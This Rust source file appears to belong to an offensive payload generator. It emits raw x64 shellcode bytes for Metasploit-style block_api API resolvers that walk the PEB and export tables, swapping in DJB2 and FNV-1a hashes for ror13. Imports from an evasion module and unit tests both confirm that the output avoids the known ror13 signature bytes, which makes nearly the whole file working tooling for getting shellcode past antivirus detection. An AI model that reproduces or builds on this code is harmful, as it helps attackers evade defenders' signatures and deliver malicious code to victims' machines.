//! Dynamic block_api resolver generation for different hash algorithms.
//!
//! Generates position-independent x64 API resolvers that use the same
//! PEB walk + export table traversal structure but with different hash kernels.

use super::evasion::HashAlgorithm;

/// Generate a block_api resolver for the given hash algorithm (x64).
///
/// The resolver follows the same calling convention as Metasploit's block_api:
/// - Input: r10d = target hash
/// - Output: jumps to resolved function (function returns to caller)
/// - Clobbers: rax, rcx, rdx, rsi, r8, r9 (saved/restored internally)
///
/// Returns the raw bytes of the resolver.
pub fn generate_block_api_x64(algo: &HashAlgorithm) -> Vec<u8> {
    match algo {
        HashAlgorithm::Ror13 => {
            // Return the original Metasploit ror13 resolver
            super::pe::BLOCK_API.to_vec()
        }
        HashAlgorithm::Djb2 => generate_djb2_resolver_x64(),
        HashAlgorithm::Fnv1a => generate_fnv1a_resolver_x64(),
    }
}

/// DJB2 resolver: hash = hash * 33 + c, init = 5381
///
/// Structure mirrors ror13 block_api but replaces hash computation.
fn generate_djb2_resolver_x64() -> Vec<u8> {
    let mut code = Vec::with_capacity(220);

    // === Save registers (same as ror13 block_api) ===
    code.extend_from_slice(&[0x41, 0x51]); // push r9
    code.extend_from_slice(&[0x41, 0x50]); // push r8
    code.push(0x52); // push rdx
    code.push(0x51); // push rcx
    code.push(0x56); // push rsi

    // === PEB walk ===
    code.extend_from_slice(&[0x48, 0x31, 0xd2]); // xor rdx, rdx
    code.extend_from_slice(&[0x65, 0x48, 0x8b, 0x52, 0x60]); // mov rdx, gs:[rdx+0x60] (PEB)
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x18]); // mov rdx, [rdx+0x18] (Ldr)
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x20]); // mov rdx, [rdx+0x20] (InMemoryOrderModuleList)

    // === Module loop start ===
    let module_loop_top = code.len();

    // Load module name pointer + length
    code.extend_from_slice(&[0x48, 0x8b, 0x72, 0x50]); // mov rsi, [rdx+0x50] (BaseDllName.Buffer)
    code.extend_from_slice(&[0x48, 0x0f, 0xb7, 0x4a, 0x4a]); // movzx rcx, word [rdx+0x4a] (MaximumLength)

    // Init module hash: mov r9d, 5381 (0x1505)
    code.extend_from_slice(&[0x41, 0xb9, 0x05, 0x15, 0x00, 0x00]); // mov r9d, 0x1505

    // === DJB2 module name hash loop ===
    // hash = hash * 33 + c (with uppercase conversion for case-insensitive matching)
    code.extend_from_slice(&[0x48, 0x31, 0xc0]); // xor rax, rax
    let mod_hash_loop = code.len();
    code.push(0xac); // lodsb
                     // Uppercase conversion (matches ror13 block_api behavior)
    code.extend_from_slice(&[0x3c, 0x61]); // cmp al, 0x61 ('a')
    code.extend_from_slice(&[0x7c, 0x02]); // jl +2 (skip sub)
    code.extend_from_slice(&[0x2c, 0x20]); // sub al, 0x20 (to uppercase)
                                           // r9d = r9d * 33: imul r9d, r9d, 33
    code.extend_from_slice(&[0x45, 0x6b, 0xc9, 0x21]); // imul r9d, r9d, 33
    code.extend_from_slice(&[0x41, 0x01, 0xc1]); // add r9d, eax
    code.push(0xe2); // loop
    let loop_offset = (mod_hash_loop as isize) - (code.len() as isize + 1);
    code.push(loop_offset as u8); // rel8 back to lodsb

    // Save module hash + module pointer
    code.push(0x52); // push rdx
    code.extend_from_slice(&[0x41, 0x51]); // push r9

    // === Export table walk ===
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x20]); // mov rdx, [rdx+0x20] (InInitOrder -> DllBase)
    code.extend_from_slice(&[0x8b, 0x42, 0x3c]); // mov eax, [rdx+0x3c] (e_lfanew)
    code.extend_from_slice(&[0x48, 0x01, 0xd0]); // add rax, rdx
    code.extend_from_slice(&[0x8b, 0x80, 0x88, 0x00, 0x00, 0x00]); // mov eax, [rax+0x88] (export dir RVA)
    code.extend_from_slice(&[0x48, 0x85, 0xc0]); // test rax, rax

    // jz skip_module (will fixup)
    code.push(0x74);
    let jz_skip_pos = code.len();
    code.push(0x00); // placeholder

    code.extend_from_slice(&[0x48, 0x01, 0xd0]); // add rax, rdx
    code.push(0x50); // push rax (save export dir)
    code.extend_from_slice(&[0x8b, 0x48, 0x18]); // mov ecx, [rax+0x18] (NumberOfNames)
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x20]); // mov r8d, [rax+0x20] (AddressOfNames RVA)
    code.extend_from_slice(&[0x49, 0x01, 0xd0]); // add r8, rdx

    // === Function name loop ===
    // jnz jumps back here (before jcxz) to re-check rcx==0 each iteration,
    // matching ror13 block_api control flow and preventing rcx underflow
    let func_loop_top = code.len();

    // jcxz next_module (skip if no more names)
    code.push(0xe3);
    let jcxz_pos = code.len();
    code.push(0x00); // placeholder

    code.extend_from_slice(&[0x48, 0xff, 0xc9]); // dec rcx
    code.extend_from_slice(&[0x41, 0x8b, 0x34, 0x88]); // mov esi, [r8+rcx*4]
    code.extend_from_slice(&[0x48, 0x01, 0xd6]); // add rsi, rdx

    // Init func hash: mov r9d, 5381
    code.extend_from_slice(&[0x41, 0xb9, 0x05, 0x15, 0x00, 0x00]); // mov r9d, 0x1505

    // DJB2 function name hash loop
    code.extend_from_slice(&[0x48, 0x31, 0xc0]); // xor rax, rax
    let func_hash_loop = code.len();
    code.push(0xac); // lodsb
    code.extend_from_slice(&[0x45, 0x6b, 0xc9, 0x21]); // imul r9d, r9d, 33
    code.extend_from_slice(&[0x41, 0x01, 0xc1]); // add r9d, eax
    code.extend_from_slice(&[0x38, 0xe0]); // cmp al, ah (test null terminator)
    code.push(0x75); // jnz
    let func_loop_offset = func_hash_loop as isize - (code.len() as isize + 1);
    code.push(func_loop_offset as u8);

    // Combine: add r9, [rsp+8] (add module hash)
    code.extend_from_slice(&[0x4c, 0x03, 0x4c, 0x24, 0x08]);
    // Compare: cmp r9d, r10d (target hash)
    code.extend_from_slice(&[0x45, 0x39, 0xd1]);
    // jnz next_func
    code.push(0x75);
    let jnz_next_func = func_loop_top as isize - (code.len() as isize + 1);
    code.push(jnz_next_func as u8);

    // === Found: resolve address ===
    code.push(0x58); // pop rax (export dir)
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x24]); // mov r8d, [rax+0x24] (AddressOfNameOrdinals)
    code.extend_from_slice(&[0x49, 0x01, 0xd0]); // add r8, rdx
    code.extend_from_slice(&[0x66, 0x41, 0x8b, 0x0c, 0x48]); // mov cx, [r8+rcx*2]
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x1c]); // mov r8d, [rax+0x1c] (AddressOfFunctions)
    code.extend_from_slice(&[0x49, 0x01, 0xd0]); // add r8, rdx
    code.extend_from_slice(&[0x41, 0x8b, 0x04, 0x88]); // mov eax, [r8+rcx*4]
    code.extend_from_slice(&[0x48, 0x01, 0xd0]); // add rax, rdx

    // === Dispatch: restore regs + jump ===
    code.extend_from_slice(&[0x41, 0x58]); // pop r8 (was module hash)
    code.extend_from_slice(&[0x41, 0x58]); // pop r8 (was module ptr)
    code.push(0x5e); // pop rsi
    code.push(0x59); // pop rcx
    code.push(0x5a); // pop rdx
    code.extend_from_slice(&[0x41, 0x58]); // pop r8
    code.extend_from_slice(&[0x41, 0x59]); // pop r9
    code.extend_from_slice(&[0x41, 0x5a]); // pop r10
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]); // sub rsp, 0x20 (shadow space)
    code.extend_from_slice(&[0x41, 0x52]); // push r10
    code.extend_from_slice(&[0xff, 0xe0]); // jmp rax

    // === Not found in this module: next module ===
    let not_found_pos = code.len();
    code.push(0x58); // pop rax (clean export dir from stack)

    // Fixup jcxz target
    code[jcxz_pos] = (not_found_pos - jcxz_pos - 1) as u8;

    code.extend_from_slice(&[0x41, 0x59]); // pop r9 (module hash)
    code.push(0x5a); // pop rdx (module ptr)
    code.extend_from_slice(&[0x48, 0x8b, 0x12]); // mov rdx, [rdx] (next module)

    // jmp module_loop_top
    code.push(0xe9);
    let jmp_offset = (module_loop_top as i32) - (code.len() as i32 + 4);
    code.extend_from_slice(&jmp_offset.to_le_bytes());

    // Fixup jz skip_module
    // When jz fires (no export dir), export dir was never pushed, so skip pop rax.
    // jz target = not_found_pos + 1 (after the pop rax byte)
    code[jz_skip_pos] = (not_found_pos + 1 - jz_skip_pos - 1) as u8;

    code
}

/// FNV-1a resolver: hash = (hash ^ c) * 0x01000193, init = 0x811c9dc5
fn generate_fnv1a_resolver_x64() -> Vec<u8> {
    let mut code = Vec::with_capacity(220);

    // === Save registers ===
    code.extend_from_slice(&[0x41, 0x51]); // push r9
    code.extend_from_slice(&[0x41, 0x50]); // push r8
    code.push(0x52); // push rdx
    code.push(0x51); // push rcx
    code.push(0x56); // push rsi

    // === PEB walk ===
    code.extend_from_slice(&[0x48, 0x31, 0xd2]); // xor rdx, rdx
    code.extend_from_slice(&[0x65, 0x48, 0x8b, 0x52, 0x60]); // mov rdx, gs:[rdx+0x60]
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x18]); // mov rdx, [rdx+0x18]
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x20]); // mov rdx, [rdx+0x20]

    let module_loop_top = code.len();

    code.extend_from_slice(&[0x48, 0x8b, 0x72, 0x50]); // mov rsi, [rdx+0x50]
    code.extend_from_slice(&[0x48, 0x0f, 0xb7, 0x4a, 0x4a]); // movzx rcx, word [rdx+0x4a]

    // Init module hash: mov r9d, 0x811c9dc5
    code.extend_from_slice(&[0x41, 0xb9, 0xc5, 0x9d, 0x1c, 0x81]); // mov r9d, 0x811c9dc5

    // FNV-1a module hash loop (with uppercase conversion)
    code.extend_from_slice(&[0x48, 0x31, 0xc0]); // xor rax, rax
    let mod_hash_loop = code.len();
    code.push(0xac); // lodsb
                     // Uppercase conversion (matches ror13 block_api behavior)
    code.extend_from_slice(&[0x3c, 0x61]); // cmp al, 0x61 ('a')
    code.extend_from_slice(&[0x7c, 0x02]); // jl +2 (skip sub)
    code.extend_from_slice(&[0x2c, 0x20]); // sub al, 0x20 (to uppercase)
                                           // r9d ^= eax
    code.extend_from_slice(&[0x41, 0x31, 0xc1]); // xor r9d, eax
                                                 // r9d *= 0x01000193: imul r9d, r9d, 0x01000193
    code.extend_from_slice(&[0x45, 0x69, 0xc9, 0x93, 0x01, 0x00, 0x01]); // imul r9d, r9d, 0x01000193
    code.push(0xe2); // loop
    let loop_offset = mod_hash_loop as isize - (code.len() as isize + 1);
    code.push(loop_offset as u8);

    code.push(0x52); // push rdx
    code.extend_from_slice(&[0x41, 0x51]); // push r9

    // === Export table walk (identical structure) ===
    code.extend_from_slice(&[0x48, 0x8b, 0x52, 0x20]);
    code.extend_from_slice(&[0x8b, 0x42, 0x3c]);
    code.extend_from_slice(&[0x48, 0x01, 0xd0]);
    code.extend_from_slice(&[0x8b, 0x80, 0x88, 0x00, 0x00, 0x00]);
    code.extend_from_slice(&[0x48, 0x85, 0xc0]);

    code.push(0x74);
    let jz_skip_pos = code.len();
    code.push(0x00);

    code.extend_from_slice(&[0x48, 0x01, 0xd0]);
    code.push(0x50);
    code.extend_from_slice(&[0x8b, 0x48, 0x18]);
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x20]);
    code.extend_from_slice(&[0x49, 0x01, 0xd0]);

    // === Function name loop ===
    // jnz jumps back here (before jcxz) to re-check rcx==0 each iteration
    let func_loop_top = code.len();

    code.push(0xe3);
    let jcxz_pos = code.len();
    code.push(0x00);

    code.extend_from_slice(&[0x48, 0xff, 0xc9]); // dec rcx
    code.extend_from_slice(&[0x41, 0x8b, 0x34, 0x88]); // mov esi, [r8+rcx*4]
    code.extend_from_slice(&[0x48, 0x01, 0xd6]); // add rsi, rdx

    // Init func hash: mov r9d, 0x811c9dc5
    code.extend_from_slice(&[0x41, 0xb9, 0xc5, 0x9d, 0x1c, 0x81]);

    // FNV-1a function hash loop
    code.extend_from_slice(&[0x48, 0x31, 0xc0]); // xor rax, rax
    let func_hash_loop = code.len();
    code.push(0xac); // lodsb
    code.extend_from_slice(&[0x41, 0x31, 0xc1]); // xor r9d, eax
    code.extend_from_slice(&[0x45, 0x69, 0xc9, 0x93, 0x01, 0x00, 0x01]); // imul r9d, r9d, 0x01000193
    code.extend_from_slice(&[0x38, 0xe0]); // cmp al, ah
    code.push(0x75);
    let func_loop_offset = func_hash_loop as isize - (code.len() as isize + 1);
    code.push(func_loop_offset as u8);

    code.extend_from_slice(&[0x4c, 0x03, 0x4c, 0x24, 0x08]);
    code.extend_from_slice(&[0x45, 0x39, 0xd1]);
    code.push(0x75);
    let jnz_next_func = func_loop_top as isize - (code.len() as isize + 1);
    code.push(jnz_next_func as u8);

    // === Found ===
    code.push(0x58);
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x24]);
    code.extend_from_slice(&[0x49, 0x01, 0xd0]);
    code.extend_from_slice(&[0x66, 0x41, 0x8b, 0x0c, 0x48]);
    code.extend_from_slice(&[0x44, 0x8b, 0x40, 0x1c]);
    code.extend_from_slice(&[0x49, 0x01, 0xd0]);
    code.extend_from_slice(&[0x41, 0x8b, 0x04, 0x88]);
    code.extend_from_slice(&[0x48, 0x01, 0xd0]);

    // === Dispatch ===
    code.extend_from_slice(&[0x41, 0x58]);
    code.extend_from_slice(&[0x41, 0x58]);
    code.push(0x5e);
    code.push(0x59);
    code.push(0x5a);
    code.extend_from_slice(&[0x41, 0x58]);
    code.extend_from_slice(&[0x41, 0x59]);
    code.extend_from_slice(&[0x41, 0x5a]);
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]);
    code.extend_from_slice(&[0x41, 0x52]);
    code.extend_from_slice(&[0xff, 0xe0]);

    // === Next module ===
    let not_found_pos = code.len();
    code.push(0x58);

    code[jcxz_pos] = (not_found_pos - jcxz_pos - 1) as u8;

    code.extend_from_slice(&[0x41, 0x59]);
    code.push(0x5a);
    code.extend_from_slice(&[0x48, 0x8b, 0x12]);

    code.push(0xe9);
    let jmp_offset = (module_loop_top as i32) - (code.len() as i32 + 4);
    code.extend_from_slice(&jmp_offset.to_le_bytes());

    code[jz_skip_pos] = (not_found_pos + 1 - jz_skip_pos - 1) as u8;

    code
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ror13_resolver_matches_constant() {
        let resolver = generate_block_api_x64(&HashAlgorithm::Ror13);
        assert_eq!(resolver.len(), 192, "ror13 resolver should be 192 bytes");
        assert_eq!(resolver, super::super::pe::BLOCK_API.to_vec());
    }

    #[test]
    fn test_djb2_resolver_no_ror13_signature() {
        let resolver = generate_block_api_x64(&HashAlgorithm::Djb2);
        // Should NOT contain ror r9d, 0x0d (41 c1 c9 0d)
        let ror13_sig = [0x41u8, 0xc1, 0xc9, 0x0d];
        assert!(
            !resolver.windows(4).any(|w| w == ror13_sig),
            "DJB2 resolver should not contain ror13 signature bytes"
        );
        // Should contain DJB2 init value 5381 = 0x1505
        let init_val = [0x05u8, 0x15, 0x00, 0x00];
        assert!(
            resolver.windows(4).any(|w| w == init_val),
            "DJB2 resolver should contain init value 5381"
        );
    }

    #[test]
    fn test_fnv1a_resolver_no_ror13_signature() {
        let resolver = generate_block_api_x64(&HashAlgorithm::Fnv1a);
        let ror13_sig = [0x41u8, 0xc1, 0xc9, 0x0d];
        assert!(
            !resolver.windows(4).any(|w| w == ror13_sig),
            "FNV-1a resolver should not contain ror13 signature bytes"
        );
        // Should contain FNV prime 0x01000193
        let prime = [0x93u8, 0x01, 0x00, 0x01];
        assert!(
            resolver.windows(4).any(|w| w == prime),
            "FNV-1a resolver should contain FNV prime"
        );
    }

    #[test]
    fn test_resolver_sizes_reasonable() {
        for algo in &[
            HashAlgorithm::Ror13,
            HashAlgorithm::Djb2,
            HashAlgorithm::Fnv1a,
        ] {
            let resolver = generate_block_api_x64(algo);
            assert!(
                resolver.len() >= 150 && resolver.len() <= 250,
                "{:?} resolver size {} out of range [150, 250]",
                algo,
                resolver.len()
            );
        }
    }

    #[test]
    fn test_all_resolvers_start_with_push_sequence() {
        // All resolvers should start with push r9; push r8; push rdx; push rcx; push rsi
        let expected_start = [0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56];
        for algo in &[
            HashAlgorithm::Ror13,
            HashAlgorithm::Djb2,
            HashAlgorithm::Fnv1a,
        ] {
            let resolver = generate_block_api_x64(algo);
            assert_eq!(
                &resolver[..7],
                &expected_start,
                "{:?} resolver should start with standard push sequence",
                algo
            );
        }
    }
}
